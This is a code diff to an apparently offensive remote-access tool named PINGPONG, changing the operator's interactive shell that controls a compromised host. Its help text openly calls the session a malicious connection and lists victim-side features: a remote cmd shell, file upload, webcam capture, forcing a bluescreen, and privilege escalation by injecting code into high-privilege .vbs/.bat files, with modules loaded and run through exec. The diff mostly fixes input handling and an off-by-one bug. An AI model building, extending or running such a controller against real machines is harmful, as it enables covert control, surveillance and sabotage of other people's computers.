@@ -135,7 +135,7 @@ def PINGPONG_shell(conn, my_ip, my_port, ip, port, printf, Autocommand):
 	def basic_choice(var):
 		if var == '33':
 			main.print_normal('PINGPONG[*]>backgrounding session......')
-			if PINGPONG_script.addsend.App_send('BG_APP', False, conn):
+			if PINGPONG_script.addsend.App_send('BG_APP', False, conn, addr, my_addr):
 				main.main()
 		elif var == '66':		
 			print_help()
@@ -150,8 +150,10 @@ def PINGPONG_shell(conn, my_ip, my_port, ip, port, printf, Autocommand):
 			main.main()
 			stop_thread(t)
 		elif var == 'PING':
-			if PINGPONG_script.addsend.App_send("CHECK_APP", False, conn):
+			if PINGPONG_script.addsend.App_send("CHECK_APP", False, conn, addr, my_addr):
 				main.print_normal("PINGPONG>[*]PONG")
+		elif var == '' or var == ' ':
+			ask_for_choice()
 		else:
 			return True
 	def print_help():
@@ -168,14 +170,19 @@ PINGPONG>[*]the PINGPONG shell is a malicious connection and it will start when 
 			bg : background the PINGPONG session
 		the below usage will be activate if u set it when u are generating the payload
 		if u have this usage, type command to use it:
-			cmd : make a cmd connection
-			upload : upload your file
-			cam_shot : take shot
-			bluescreen : make a bluescreen on the attacked host
-			priv_vbp_listen : when a high-priv file(.vbs .bat .psl) is created, inject code which can make your priv higher""")
+			basic command:
+				cmd : make a cmd connection
+				getinformation : to obtain some information(priv, username, etc.) of this connection
+				upload : upload your file
+			media:
+				cam_shot : take shot
+			special_attacks:
+				bluescreen : make a bluescreen on the attacked host
+			priv:
+				priv_vbp_listen : when a high-priv file(.vbs .bat .psl) is created, inject code which can make your priv higher""")
 		
 	def ask_for_choice(list=False, print_out=True):
-		if PINGPONG_script.addsend.App_send("SHOW_ALL_USAGE_APP", False, conn):
+		if PINGPONG_script.addsend.App_send("SHOW_ALL_USAGE_APP", False, conn, addr, my_addr):
 			all_mod_usage_dict = {}
 			mods = []
 			script_path = os.path.dirname(os.path.abspath(__file__))
@@ -204,10 +211,10 @@ PINGPONG>[*]the PINGPONG shell is a malicious connection and it will start when 
 				if list:
 					main.print_normal(f'''PINGPONG>[*]usage : {usage_list}''')
 				else:
-					main.print_normal("PINGPONG>[*]Connection: " + my_ip + ":" + str(my_port) + " >>> " + ip + ":" + str(port))
 					main.print_normal(''' 
 	---------------------PINGPONG usage---------------------
 	''')
+					main.print_normal("Connection: " + my_ip + ":" + str(my_port) + " >>> " + ip + ":" + str(port))
 				id_count = 0
 				mod_id_dst = {}
 				for _mod in mods:
@@ -221,6 +228,9 @@ PINGPONG>[*]the PINGPONG shell is a malicious connection and it will start when 
 					main.print_good('   	99) exit')
 				mod_choice = input('PINGPONG>')
 				def load_mod(_mod_choice, conn, addr, my_addr):
+					if not _mod_choice in mod_id_dst.keys():
+						main.print_error('PINGPONG>[-]No such choice')
+						return False
 					modl = mod_id_dst[_mod_choice]
 					mod_usage_list = []
 					for usage in usage_list:
@@ -242,7 +252,7 @@ PINGPONG>[*]the PINGPONG shell is a malicious connection and it will start when 
 						script_choice = int(script_choice)
 					except:
 						main.print_error("PINGPONG>[-]No such choice")
-					if script_choice in [i for i in range(1, id_count)]:
+					if script_choice in [i for i in range(1, id_count+1)]:
 						script = script_id_dst[script_choice]
 						exec(f'import PINGPONG_script.{modl}.{script}')
 						exec(f'PINGPONG_script.{modl}.{script}.run(conn, addr, my_addr)')
